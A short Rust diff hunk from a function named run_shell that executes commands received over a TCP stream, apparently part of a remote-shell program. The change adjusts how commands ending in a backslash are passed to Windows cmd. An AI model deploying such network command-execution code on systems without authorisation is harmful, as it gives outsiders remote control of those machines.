@@ -63,8 +63,13 @@ fn run_shell(mut stream: TcpStream) {
         }
 
         let output = if cfg!(windows) {
+            let win_cmd = if cmd.ends_with('\\') {
+                format!("{cmd} ")
+            } else {
+                cmd.to_string()
+            };
             Command::new("cmd")
-                .args(["/C", cmd])
+                .args(["/C", &win_cmd])
                 .stdout(Stdio::piped())
                 .stderr(Stdio::piped())
                 .output()
